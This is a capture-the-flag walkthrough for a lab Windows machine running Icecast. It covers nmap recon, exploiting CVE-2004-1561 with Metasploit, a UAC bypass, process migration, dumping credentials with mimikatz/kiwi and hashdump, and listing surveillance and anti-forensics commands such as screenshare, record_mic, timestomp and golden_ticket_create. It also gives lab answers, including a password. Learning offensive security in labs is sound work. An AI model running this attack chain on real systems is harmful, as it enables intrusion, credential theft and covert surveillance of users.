# Recon

first of all we start using nmap 

we would  use  SYN scan to scan the machine as its suggested in the question #nmap_syn 

```bash

nmap -sS -sV -p- "ip machine"

```

![](https://i.imgur.com/jbkLvSF.png)

if u search for ms-wbt-server it would be MSRDP.

**Q3**: MSRDP port

A3: 3389

**Q4**: what service is running on 8000 port 

A4: http-alt

Q5: service is running on port 8000

A5: icecast

Q6:the hostname of the machine

A6: DARK-PC  ==from last line in the picture above==

![](https://i.imgur.com/yCZYjCx.png)

# Gain Access 

First question told us that there is vulnerability in icecast. what is it? so to answer this we want to search in  [https://www.cvedetails.com](https://www.cvedetails.com/) 

![](https://i.imgur.com/Q91WT1d.png)



as we can see there is 5 vulnerability suspected due to it's score ==as it mentioned in the question score is 7.5== also as we can see 3&10&11 is DoS Denial of service. and that what we don't want. we left with 6&9  I went to 

[exploit-db.com](https://www.exploit-db.com/) and search for both CVE-2004-1561 & CVE-2002-0177 

![](https://i.imgur.com/4xhOa3Z.png)

![](https://i.imgur.com/XLlaUeV.png)

as we can see in CVE-2004-1561 there is metasploit module about it. so it could be the one we are looking for. since the CTF containing Metasploit tag. but we aren't sure. let's go back to CVE-Details navigate into CVE-2004-1561  ![](https://i.imgur.com/hUHqqn7.png)

let's try this answer for the first question 

**Q1**: What type of vulnerability is it?

A1:Execute code overflow

**Q2**: What is CVE number

A2:CVE-2004-1561

==if the answers was wrong. then we should to search all suspected CVE in the picture above== but we got this right.

**Q3**: Ask u to run the metasploit

```bash

msfconsole

```

![](https://i.imgur.com/wYbrLj3.png)

after we run metasploit. use 

```

search icecast

```

to search for the module. and as we can see it's disclosure at 2004. same as CVE. 

**Q4**: Ask for the exploitation module ==from the above picture==

A4:  exploit/windows/http/icecast_header

**Q5**: ask u to use the module 

```

use 0 

or

use icecast

```

**Q6**: show options. and what setting is currently blank?

A6:RHOSTS ==(machine ip)==

**Q7:** Ask to set LHOST with your local machine ip

![](https://i.imgur.com/QsapfmT.png)



# Escalate

after we setting everything type 

```

run 

```

and u should get meterpreter session.

![](https://i.imgur.com/H9g619q.png)

**Q1**: What's the name of the shell we have now?

A1: meterpreter ==as it shown in command prompt.==



**Q2**:what user was running that icecast process?? ==getuid==

A2:Dark

![](https://i.imgur.com/KLzXUke.png)



**Q3**: What build of windows is the system? ==sysinfo==

A3:7601



**Q4**: what is the architecture of the process we're running? ==sysinfo==

A4:x64

![](https://i.imgur.com/OcpwJli.png)



**Q5**: ask us to use post exploitation module in metasploit that is post/multi/recon/local_exploit_suggester u can run it in metasploit using     #post_exploition_msf 

```

run post/multi/recon/local_exploit_suggester

```



**Q6**: after we run the exploit suggester. What is the full path (starting with exploit/) for the first returned exploit?

A6: exploit/windows/local/bypassuac_eventvwr

![](https://i.imgur.com/0QVcNTe.png)





**Q7**: background the session

A7 : background it using Ctrl+z or

```

meterpreter> background

```

Q8: ask us to use that exploit we found earlier

A8: type on msf 

```

use exploit/windows/local/bypassuac_eventvwr

```

Q9: show options and set the session

A9: type "session -i" to check the sessions is running then type "show options" then type "set session SESSION_NUMBER"

![](https://i.imgur.com/K50kHj3.png)

**Q10**: We'll have to set one more as our listener IP isn't correct. What is the name of this option? ==set LHOST "LOCAL IP"==

A10: Lhost

**Q11**: ~

**Q12** : type "run" to start 

**Q13**: ~

as we can see after we type "run" we got a session 

![](https://i.imgur.com/y2A6W9T.png)



**Q15**: type "getprivs". What permission listed allows us to take ownership of files?

A15:SeTakeOwnershipPrivilege

![](https://i.imgur.com/vGs9EIG.png)

















# Looting

Now we will use mimikatz to find additional creds and infos

**Q1:** We want to move to a proccess that has the permissions that we need to interact with the lsass service. ==lsass : **Local Security Authority Subsystem Service** (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.==



**Q2:** In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?



Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.



A2: spoolsv.exe

![](https://i.imgur.com/6AMYq70.png)



**Q3**: migrate to this process

A3 : to migrate use 

```

migrate -N spoolsv.exe

```



**Q4**:  Let's check what user we are now with the command `getuid`. What user is listed?

A4: NT AUTHORITY\SYSTEM

![](https://i.imgur.com/Becv1hF.png)



**Q5**: Mimikatz is a rather infamous password dumping tool that is incredibly useful. run kiwi using this command #kiwi

```

meterpreter> load kiwi

```



**Q6**: type "help" to get additional information about kiwi and meterpreter



**Q7**: Which command allows up to retrieve all credentials?

A7:creds_all

![](https://i.imgur.com/k3vpIUg.png)



**Q8**: run creds_all. what is Dark password?

A8: Password01!

![](https://i.imgur.com/E8tYtrQ.png)









**Q1**: type "help" on meterpreter command prompt to answer next questions



**Q2**: What command allows us to dump all of the password hashes stored on the system

A2: hashdump

![](https://i.imgur.com/TV9xgOC.png)



**Q3**:what command allows us to watch the remote user's desktop in real time?

A3: screenshare

![](https://i.imgur.com/5FyVBs3.png)



**Q4:** How about if we wanted to record from a microphone attached to the system?

A4:record_mic

![](https://i.imgur.com/WDlB48X.png)



**Q5**: we can modify timestamps of files on the system. What command allows us to do this?

A5: timestomp

![](https://i.imgur.com/SdR1HpW.png)



**Q6**: Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

A6: golden_ticket_create

![](https://i.imgur.com/d63Zt5r.png)















